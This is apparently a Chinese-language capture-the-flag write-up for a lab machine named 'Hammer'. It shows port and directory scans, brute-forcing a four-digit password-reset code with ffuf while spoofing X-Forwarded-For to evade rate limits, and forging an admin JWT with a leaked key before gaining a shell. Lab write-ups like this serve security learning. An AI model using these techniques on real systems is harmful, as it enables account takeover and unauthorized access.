# Hammer

端口扫描

```shell
sudo nmap --min-rate 10000 -p- 10.10.74.232

PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste
```

详细端口扫描

```shell
sudo nmap -sT -sC -sV -O 10.10.74.232 -p22,1337

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c5:22:9f:91:f8:6e:97:2d:14:c1:01:6c:97:59:fe:01 (RSA)
|   256 5a:cb:12:ff:5b:0d:44:41:22:71:43:a8:3f:5b:84:48 (ECDSA)
|_  256 5d:aa:67:cc:03:09:4d:62:86:c0:86:2c:23:6c:54:38 (ED25519)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
```

打开网站是一个邮箱密码登录页面

还有一个密码找回的功能

打开网页源代码看看

```html
<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
```

一行注释，告诉我们路径名一定是hmr_DIRECTORY_NAME这种格式的，那就让hmr_作为前缀进行目录扫描

```shell
sudo dirsearch 10.10.74.232:1337 --prefixes hmr_

301   320B   http://10.10.49.188:1337/hmr_js    -> REDIRECTS TO: http://10.10.49.188:1337/hmr_js/
301   321B   http://10.10.49.188:1337/hmr_css    -> REDIRECTS TO: http://10.10.49.188:1337/hmr_css/
301   324B   http://10.10.49.188:1337/hmr_images    -> REDIRECTS TO: http://10.10.49.188:1337/hmr_images/
200   464B   http://10.10.49.188:1337/hmr_images/
200   470B   http://10.10.49.188:1337/hmr_js/
301   322B   http://10.10.49.188:1337/hmr_logs    -> REDIRECTS TO: http://10.10.49.188:1337/hmr_logs/
200   462B   http://10.10.49.188:1337/hmr_logs/
```

打开http://10.10.49.188:1337/hmr_logs/

在http://10.10.49.188:1337/hmr_logs/error.logs中发现如下内容

```html
[Mon Aug 19 12:00:01.123456 2024] [core:error] [pid 12345:tid 139999999999999] [client 192.168.1.10:56832] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow
[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php
[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
[Mon Aug 19 12:07:29.321098 2024] [core:error] [pid 12352:tid 139999999999992] [client 192.168.1.35:42310] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down

```

发现一个邮箱，尝试找回密码

发现是通过一个四位数验证码来进行的身份

在bp里研究之后发现会对验证码的尝试次数有限制，但是从不同的IP地址发出的相同请求是可以重置该限制的，并且是不会对IP经行验证的，那就直接进行爆破

```shell
生成验证码字典
seq -w 0000 9999 >> codes.txt
爆破
ffuf -u http://10.10.74.232:1337/reset_password.php -w codes.txt -X "POST" -H "Content-Type: application/x-www-form-urlencoded" -H "X-Forwarded-For: FUZZ" -H "Cookie: PHPSESSID=drbe3iikr8i168uigqgtmtqh3l" -d "recovery_code=FUZZ" -fr "Invalid"
```

拿到验证码之后重置密码，再次登录

看到我们的角色为user，并且可以命令执行,但多次尝试之后发现好像只有ls可以执行，并且注意到页面每隔一段时间就会自动登出，查看源代码后发现它会检查persistentSession的值是否为true，如果值为no就会登出，我们可以在localstorage中将其手动更改为true，或者在bp中测试

```html
ls

188ade1.key
composer.json
config.php
dashboard.php
execute_command.php
hmr_css
hmr_images
hmr_js
hmr_logs
index.php
logout.php
reset_password.php
vendor
```

直接访问网址http://10.10.74.232:1337/188ade1.key将188ade1.key下载下来，打开拿到密钥56058354efb3daa97ebab00fabd7a7d7

猜测其为jwt的密钥，在https://jwt.io/中修改jwt令牌，使role为admin，并填写密钥

将新拿到的token替换掉原先的，再执行其他命令即可成功

最后反弹shell，拿到flag